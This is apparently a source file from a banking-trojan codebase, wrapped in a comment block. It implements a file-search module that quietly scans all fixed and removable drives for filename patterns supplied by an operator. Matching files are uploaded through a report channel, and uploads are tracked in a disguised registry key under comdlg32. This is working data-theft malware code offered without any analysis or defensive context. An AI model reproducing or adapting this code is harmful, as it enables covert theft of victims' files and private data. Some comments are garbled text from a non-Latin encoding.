/*
#include <windows.h>

#include "defines.h"
#include "filesearch.h"

#define SLEEP_SD_FILESEARCH    10000 //ms
#define STR_UPFILES_REGMEM L"software\\microsoft\\windows\\currentversion\\explorer\\comdlg32"

static CRITICAL_SECTION csfs;
static LPWSTR *pQuests;
static DWORD dwQuestsCount;

static bool ThisFileAlreadyUploaded(LPWSTR pFileName, DWORD dwSize)
{
  return Registry::_getValueAsDword(HKEY_CURRENT_USER, STR_UPFILES_REGMEM, pFileName) == dwSize ? true : false;
}

static void MarkFileAsUploaded(LPWSTR pFileName, DWORD dwSize)
{
  Registry::_setValueAsDword(HKEY_CURRENT_USER, STR_UPFILES_REGMEM, pFileName, dwSize);
}

static void SaveQuest(void)
{
  LPSTR pBuf  = NULL;
  DWORD dwSize = 0;
  LPSTR ps;

  CWA(kernel32, EnterCriticalSection)(&csfs);
  for(DWORD i = 0; i < dwQuestsCount; i++)if(pQuests[i] && (ps = Str::_unicodeToAnsiEx(pQuests[i], -1)))
  {
    DWORD s = Str::_LengthA(ps);
    if(Mem::reallocEx(&pBuf, dwSize + s + 1))
    {
      //FIXME: quotes
      Mem::_copy(pBuf + dwSize, ps, s);
      dwSize += s;
      pBuf[dwSize++] = ' ';
    }
    Mem::free(ps);
  }
  CWA(kernel32, LeaveCriticalSection)(&csfs);
  //RegStorage::SaveData(RSUT_COMMON, REGSTORAGE_DATA_FSQUEST, (LPBYTE)pBuf, dwSize);
  Mem::free(pBuf);
}

static bool ListDir(LPWSTR pDir, LOADERSPYDATA *plsd)
{
  WCHAR Path[MAX_PATH];
  Fs::_pathCombine(Path, pDir, L"*");
  Path[MAX_PATH - 1] = 0; //�� ������ ������
  WIN32_FIND_DATAW wfd;
  HANDLE hS = CWA(kernel32, FindFirstFileW)(Path, &wfd);
  if(hS == INVALID_HANDLE_VALUE)return false;
  do
  {
    if(wfd.cFileName[0] == '.' && (wfd.cFileName[1] == 0 || (wfd.cFileName[1] == '.' && wfd.cFileName[2] == 0)))continue;

    if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
    {
      Fs::_pathCombine(Path, pDir, wfd.cFileName);
      WDEBUG1(WDDT_INFO, "--> %s", Path);
      if(CWA(kernel32, WaitForSingleObject)(plsd->hQuit, 1000) != WAIT_TIMEOUT)break;
      ListDir(Path, plsd);
      continue;
    }

    CWA(kernel32, EnterCriticalSection)(&csfs);
    for(DWORD i = 0; i < dwQuestsCount; i++)if(pQuests[i] && wfd.nFileSizeHigh == 0 && CWA(shlwapi, PathMatchSpecW)(wfd.cFileName, pQuests[i]))
    {
      Fs::_pathCombine(Path, pDir, wfd.cFileName);
      if(!ThisFileAlreadyUploaded(Path, wfd.nFileSizeLow))
      {
        WDEBUG1(WDDT_INFO, "FileSearch: I found file %s", Path);
        WCHAR rempath[MAX_PATH];
        CWA(shlwapi, wnsprintfW)(rempath, MAX_PATH - 1, L"filesearch\\%06X_%s", wfd.nFileSizeLow, wfd.cFileName);
        if(Report::writeFile(Path, NULL, rempath))MarkFileAsUploaded(Path, wfd.nFileSizeLow);
        if(CWA(kernel32, WaitForSingleObject)(plsd->hQuit, SLEEP_SD_FILESEARCH) != WAIT_TIMEOUT)goto END;
        break;
      }
    }
    CWA(kernel32, LeaveCriticalSection)(&csfs);
    CWA(kernel32, Sleep)(20);
  }
  while(dwQuestsCount > 0 && CWA(kernel32, FindNextFileW)(hS, &wfd));
END:
  CWA(kernel32, FindClose)(hS);
  return true;
}

static void WINAPI FSProc(LOADERSPYDATA *plsd)
{
  CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_IDLE);
  WDEBUG0(WDDT_INFO, "FileSearch: Started");

  while(CWA(kernel32, WaitForSingleObject)(plsd->hQuit, SLEEP_SD_FILESEARCH) == WAIT_TIMEOUT)
  {
    DWORD dwTmp;

    //���� �������
    //CWA(kernel32, EnterCriticalSection)(&csfs);
    //dwTmp = dwQuestsCount;
    //CWA(kernel32, LeaveCriticalSection)(&csfs);
    if(dwQuestsCount == 0)continue;

    WCHAR Path[8];
    DWORD dwDrives = CWA(kernel32, GetLogicalDrives)();
    for(BYTE i = 2/*���������� fdd* /; i < 32; i++)if(dwDrives & (1 << i))
    {
      Path[0] = i + 'A';
      Path[1] = ':';
      Path[2] = '\\';
      Path[3] = 0;

      dwTmp = CWA(kernel32, GetDriveTypeW)(Path);
      if(dwTmp != DRIVE_FIXED && dwTmp != DRIVE_REMOVABLE/* && dwTmp != DRIVE_CDROM* /)continue;
      ListDir(Path, plsd);
      if(CWA(kernel32, WaitForSingleObject)(plsd->hQuit, SLEEP_SD_FILESEARCH) != WAIT_TIMEOUT)goto END;
    }
  }

END:
  WDEBUG0(WDDT_INFO, "FileSearch: Ended");
  plsd->dwThreads--;
  CWA(kernel32, ExitThread)(0);
}

bool FileSearch::StartThread(LOADERSPYDATA *plsd)
{
  CWA(kernel32, InitializeCriticalSection)(&csfs);
  plsd->dwThreads++;
  pQuests = NULL;
  dwQuestsCount = 0;

  LPBYTE pList = NULL;
  DWORD dwListSize = 0;//RegStorage::LoadData(RSUT_COMMON, REGSTORAGE_DATA_FSQUEST, &pList);
  if(dwListSize)
  {
    AddQuest((LPSTR)pList, dwListSize);
    Mem::free(pList);
  }

  if(Process::_createThread(0, (LPTHREAD_START_ROUTINE)FSProc, plsd) != 0)return true;
  plsd->dwThreads--;
  return false;
}

bool FileSearch::AddQuest(LPSTR pExts, DWORD dwSize)
{
  bool ok = false;
  LPSTR *pArgs = NULL;
  DWORD dwCount = StrOld::GetArgsA(pExts, pExts + dwSize, &pArgs, NULL, 100);

  if(dwCount)
  {
    CWA(kernel32, EnterCriticalSection)(&csfs);
    if(Mem::reallocEx(&pQuests, (dwQuestsCount + dwCount) * sizeof(LPWSTR)))for(DWORD i = 0; i < dwCount; i++)
    {
      if((pQuests[dwQuestsCount] = Str::_ansiToUnicodeEx(pArgs[i], -1)) != NULL)
      {
        dwQuestsCount++;
        ok = true;
      }
    }
    SaveQuest();
    CWA(kernel32, LeaveCriticalSection)(&csfs);
    Mem::freeArrayOfPointers(pArgs, dwCount);
  }
  return ok;
}

bool FileSearch::RemoveQuest(LPSTR pExts, DWORD dwSize)
{
  bool ok = false;
  LPSTR *pArgs = NULL;
  DWORD dwCount = StrOld::GetArgsA(pExts, pExts + dwSize, &pArgs, NULL, 100);
  LPWSTR pA;

  if(dwCount)
  {
    CWA(kernel32, EnterCriticalSection)(&csfs);
    for(DWORD k = 0; k < dwCount; k++)if((pA = Str::_ansiToUnicodeEx(pArgs[k], -1)))
    {
      for(DWORD i = 0; i < dwQuestsCount; i++)if(pQuests[i] && CWA(kernel32, lstrcmpiW)(pQuests[i], pA) == 0)
      {
        Mem::free(pQuests[i]);
        pQuests[i] = NULL;
      }
      Mem::free(pA);
    }

    DWORD bads = 0;
    for(; bads < dwQuestsCount; bads++)if(pQuests[bads] != NULL)break;
    if(bads == dwQuestsCount)
    {
      dwQuestsCount = 0;
      Mem::free(pQuests);
    }
    CWA(kernel32, LeaveCriticalSection)(&csfs);
    Mem::freeArrayOfPointers(pArgs, dwCount);
  }

  SaveQuest();
  return ok;
}

*/
